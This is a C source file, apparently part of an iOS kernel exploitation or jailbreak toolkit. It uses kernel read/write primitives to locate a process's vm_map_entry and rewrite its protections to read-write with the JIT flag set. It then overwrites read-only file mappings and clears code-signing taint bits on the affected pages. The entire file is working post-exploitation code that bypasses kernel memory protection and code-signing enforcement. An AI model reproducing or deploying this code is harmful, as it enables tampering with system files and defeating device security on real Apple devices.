#include <mach/vm_prot.h>
#include <stdio.h>
#include <stdint.h>
#import "helpers.h"
#import "vm_page.h"

/*
#define O_HDR_FIRST       0x08
#define O_HDR_NENTRIES    0x20
#define O_ENTRY_NEXT      0x08
#define O_ENTRY_START     0x10
#define O_ENTRY_END       0x18

static uint64_t find_vm_map_entry(uint64_t vm_map, uint64_t uaddr) {
    uint64_t header = vm_map + off_vm_map_hdr;
    uint64_t entry = S(kread64(header + O_HDR_FIRST));
    uint32_t nentries = kread32(header + O_HDR_NENTRIES);
    printf("[*] vm_map entries: %u, looking for 0x%llx first_entry: 0x%llx\n", nentries, uaddr, entry);

    for (uint32_t i = 0; i < nentries && is_kaddr_valid(entry); i++) {
        uint64_t start = kread64(entry + O_ENTRY_START);
        uint64_t end   = kread64(entry + O_ENTRY_END);
        if (uaddr >= start && uaddr < end) {
            printf("[*] Found entry 0x%llx: 0x%llx-0x%llx\n", entry, start, end);
            return entry;
        }
        entry = S(kread64(entry + O_ENTRY_NEXT));
    }
    printf("[*] vm_map_entry not found for 0x%llx\n", uaddr);
    return 0;
}
*/

uint64_t find_vm_map_entry(uint64_t vm_map, uint64_t uaddr) {
    uint64_t header_addr = vm_map + off_vm_map_hdr;
    
    struct vm_map_header header = {0};
    kread(header_addr, &header, sizeof(header));
    
    uint64_t entry_addr = S(header.links.next);
    uint32_t nentries = header.nentries;
    
    for (uint32_t i = 0; i < nentries && is_kaddr_valid(entry_addr); i++) {
        struct vm_map_entry entry = {0};
        kread(entry_addr, &entry, sizeof(entry));
        
        uint64_t start = entry.links.start;
        uint64_t end   = entry.links.end;
        if (uaddr >= start && uaddr < end) {
            printf("[*] Found vm_map_entry at 0x%llx: 0x%llx-0x%llx\n", entry_addr, start, end);
            return entry_addr;
        }
        entry_addr = S(entry.links.next);
    }

    printf("[*] vm_map_entry not found for address 0x%llx\n", uaddr);
    return 0;
}

#pragma mark - vm_page_init

uint64_t get_kernel_slide(void)
{
    return  g_kernel_slide;
}

void vm_page_init(void) {
    _Static_assert(sizeof(struct vm_page) == 48, "vm_page size must be 48 bytes");
    _Static_assert(offsetof(struct vm_page, vmp_offset) == 32, "vmp_offset at wrong offset");

    vm_page_array_beginning_addr = kread64(get_kernel_slide() + kernelcache__vm_page_array_beginning_addr);
    vm_page_array_ending_addr    = kread64(get_kernel_slide() + kernelcache__vm_page_array_ending_addr);
    vm_first_phys_ppnum          = kread32(get_kernel_slide() + kernelcache__vm_first_phys_ppnum);
    vm_pages_count               = kread64(get_kernel_slide() + kernelcache__vm_pages_count);
}

#pragma mark - vm_page_unpack_ptr_fix

struct vm_page * vm_pages_array_internal(void) {
    return (struct vm_page *)vm_page_array_beginning_addr;
}

static inline uintptr_t vm_page_unpack_ptr_fix(uintptr_t p) {
    if (p >= VM_PAGE_PACKED_FROM_ARRAY) {
        p &= ~VM_PAGE_PACKED_FROM_ARRAY;
        return (uintptr_t)vm_page_get((uint32_t)p);
    }

    // For iOS 16.0+
    return (p << 6) + 0xFFFFFFDC00000000ULL;
}

#pragma mark - vm_object

void vm_page_fix_cs(uint64_t kaddr) {
    struct vm_page obj = {0};
    kread(kaddr, &obj, sizeof(obj));
    if (obj.vmp_cs_validated) {
        obj.vmp_cs_tainted = 0;
        obj.vmp_wpmapped   = 0;
    }
    uint8_t *obj_ptr = (uint8_t *)&obj;
    // Fix for zone element
    kwrite32bytes(kaddr, obj_ptr);
    kwrite32bytes(kaddr + 16, obj_ptr + 16);
}

void vm_object_fix_cs_internal_copy(struct vm_object* object, uint64_t object_kaddr) {
    if (object_kaddr == 0) {
        return;
    }
    
    if (object->resident_page_count) {
        uint64_t page_kaddr = vm_page_unpack_ptr(object->memq.next);
        while (page_kaddr != object_kaddr) {
            if (page_kaddr == 0) {
                break;
            }
            vm_page_fix_cs(page_kaddr);
            
            struct vm_page page = {};
            kread(page_kaddr, &page, sizeof(page));
            page_kaddr = vm_page_unpack_ptr(page.vmp_listq.next);
        }
    }
}

void vm_object_fix_cs_copy(uint64_t kaddr) {
    struct vm_object obj = {0};
    kread(kaddr, &obj, sizeof(obj));
    
    vm_object_fix_cs_internal_copy(&obj, kaddr);
}

void vm_object_fix_cs_internal(struct vm_object* object, uint64_t object_kaddr) {
    if (object_kaddr == 0) {
        return;
    }
    
    if (object->resident_page_count) {
        uint64_t page_kaddr = vm_page_unpack_ptr(object->memq.next);
        while (page_kaddr != object_kaddr) {
            if (page_kaddr == 0) {
                break;
            }
            vm_page_fix_cs(page_kaddr);
            
            struct vm_page page = {};
            kread(page_kaddr, &page, sizeof(page));
            page_kaddr = vm_page_unpack_ptr(page.vmp_listq.next);
        }
    }
    
    if (object->shadow) {
        vm_page_fix_cs(object->shadow);
    }
    
    if (object->vo_copy) {
        vm_object_fix_cs_copy(object->vo_copy);
    }
}

void vm_object_fix_cs(uint64_t kaddr) {
    struct vm_object obj = {0};
    kread(kaddr, &obj, sizeof(obj));
    
    vm_object_fix_cs_internal(&obj, kaddr);
}

#pragma mark - overwrite_file_mapping

// --- Low-level offsets and bitfield macros for vm_map_entry ---
#define VME_OFF_FLAGS        0x48   // Starting offset of flags field in vm_map_entry
#define VME_PROT_SHIFT       7      // Left shift for protection (3 bits)
#define VME_PROT_MASK        0x7    // Protection mask (binary 111)
#define VME_MAXPROT_SHIFT    11     // Left shift for max_protection (4 bits)
#define VME_MAXPROT_MASK     0xF    // Max_protection mask (binary 1111)
#define VME_USED_FOR_JIT_BIT 23     // used_for_jit flag bit position

// --- Safe window configuration for the kwrite32 primitive ---
// Explanation: Our kwrite32 forcibly writes 32 bytes (0x20).
// Writing from 0x48 would cover 0x48 + 0x20 = 0x68, exceeding the typical
// vm_map_entry size (0x50) and causing a zone panic.
// Therefore we shift the base backward to 0x2C.
// 0x2C + 0x20 = 0x4C <= 0x50, which is guaranteed safe.
#define SAFE_WINDOW_OFFSET   0x2C
#define FLAGS_BUFFER_OFFSET  (VME_OFF_FLAGS - SAFE_WINDOW_OFFSET) // Relative offset of flags within the 32‑byte buffer (0x1C)

void patch_vm_map_entry_to_rw_zone_element(uint64_t entry_addr) {
    // 1. Compute safe base address for reading/writing
    uint64_t safe_base_addr = entry_addr + SAFE_WINDOW_OFFSET;
    uint8_t buffer[EARLY_KRW_LENGTH]; // EARLY_KRW_LENGTH = 32

    // 2. Read the safe window containing the flags field (32 bytes)
    kread(safe_base_addr, buffer, EARLY_KRW_LENGTH);

    // 3. Locate the flags variable inside the buffer
    uint32_t *flags_ptr = (uint32_t *)(buffer + FLAGS_BUFFER_OFFSET);
    uint32_t flags = *flags_ptr;
    
    printf("[*] Original flags at offset 0x48: 0x%08x\n", flags);
    uint32_t new_flags = flags;

    // 4. Modify protection to VM_PROT_READ | VM_PROT_WRITE (0x3)
    new_flags &= ~(VME_PROT_MASK << VME_PROT_SHIFT);
    new_flags |=  ((VM_PROT_READ | VM_PROT_WRITE) << VME_PROT_SHIFT);

    // 5. Modify max_protection to VM_PROT_READ | VM_PROT_WRITE (0x3)
    new_flags &= ~(VME_MAXPROT_MASK << VME_MAXPROT_SHIFT);
    new_flags |=  ((VM_PROT_READ | VM_PROT_WRITE) << VME_MAXPROT_SHIFT);

    // 6. Enable used_for_jit flag (optional, required for certain bypasses)
    new_flags |= (1 << VME_USED_FOR_JIT_BIT);

    // 7. Only write back if the flags have actually changed
    if (new_flags != flags) {
        printf("[*] Patching flags: 0x%08x -> 0x%08x\n", flags, new_flags);
        
        // Update local buffer value
        *flags_ptr = new_flags;
        
        // Write back the entire 32‑byte safe window unchanged
        kwrite32bytes(safe_base_addr, buffer);
        
        printf("[*] Patch applied successfully (zone-safe window method).\n");
    } else {
        printf("[*] Flags already have desired permissions; skipping write.\n");
    }
}

bool overwrite_file_mapping(void *to_mapping, void *from_buf, uint64_t len) {
    // vm_page_init();
    assert(vm_page_array_beginning_addr > kernelcache__vm_page_array_beginning_addr);
    
    uint64_t entry_addr = find_vm_map_entry(task_get_vm_map(task_self()), (uint64_t)to_mapping);
    if (entry_addr == 0) {
        printf("[*] Failed to find vm_map_entry for mapping at %p\n", to_mapping);
        return false;
    }
    
    // Make the mapping writable
    printf("[*] Adjusting vm_map_entry protections to RW...\n");
    _Static_assert(sizeof(struct vm_map_entry) == 80, "vm_map_entry size must be 80 bytes");
    
    // patch_vm_map_entry_to_rw_zone_element(entry_addr);
    struct vm_map_entry entry = {0};
    kread(entry_addr, &entry, sizeof(entry));
    entry.used_for_jit = 1;
    entry.protection = VM_PROT_READ | VM_PROT_WRITE;
    entry.max_protection = VM_PROT_READ | VM_PROT_WRITE;
    
    // write EARLY_KRW_LENGTH(0x20) for zone element
    
    uint64_t offset = sizeof(struct vm_map_entry) - 0x20;
    kwrite32bytes(entry_addr + offset, (uint64_t)(&entry) + offset);
    
    uint64_t f1 = kread64(entry_addr + 0x48);
    printf("[*] vm_map_entry offset 0x48 after patch: 0x%llx\n", f1);
    
    // Copy data in chunks
    for (uint64_t offset = 0; offset < len; offset += 0x4000) {
        uint64_t copySize = (offset + 0x4000 > len) ? (len - offset) : 0x4000;
        if (memcmp(to_mapping + offset, from_buf + offset, copySize) != 0) {
            printf("[*] Writing chunk at offset 0x%llX\n", offset);
            memcpy(to_mapping + offset, from_buf + offset, copySize);
        }
    }
    
    // Fix code signing status for the associated VM object
    struct vm_map_entry entry_cont = {0};
    kread(entry_addr, &entry_cont, sizeof(entry_cont));
    if (!entry_cont.is_sub_map && !entry_cont.vme_kernel_object) {
        uint64_t object_kaddr = entry_cont.vme_object_or_delta;
        uint64_t unpack_object_kaddr = vm_page_unpack_ptr(object_kaddr);

        if (unpack_object_kaddr) {
            vm_object_fix_cs(unpack_object_kaddr);
        }
    }

    return true;
}
